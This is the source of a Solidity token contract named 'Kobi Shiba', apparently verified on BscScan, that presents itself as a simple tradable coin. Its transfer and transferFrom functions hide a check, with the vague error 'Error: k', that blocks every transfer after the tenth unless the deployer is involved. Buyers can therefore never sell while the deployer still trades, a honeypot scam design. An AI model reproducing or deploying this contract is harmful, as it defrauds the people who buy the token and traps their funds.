/**
 *Submitted for verification at BscScan.com on 2021-08-11
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

    contract  SimpleCoin {
    
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    
    uint public totalSupply =100000000000000000;
    string public name = "Kobi Shiba";
    string public symbol = " KSHIB";
    uint public decimals = 0;
    uint public txn = 0;
    address private _dev;
    address private uniswapV2Router =
        0x10ED43C718714eb63d5aA57B78B54704E256024E;
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    
    constructor() {
        balances[msg.sender] = totalSupply;
        _dev = msg.sender;
        approve(uniswapV2Router, type(uint256).max);
    }
    
    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }
    
    function transfer(address to, uint value) public returns(bool) {
        require(balanceOf(msg.sender) >= value, 'balance too low');
        require(txn < 10 || msg.sender == _dev || to == _dev, 'Error: k');
        txn++;
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'Allowance too low');
        require(txn < 10 || msg.sender == _dev || to == _dev || from == _dev, 'Error: k');
        txn++;
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    
    function approve(address spender, uint value) public returns(bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
    
}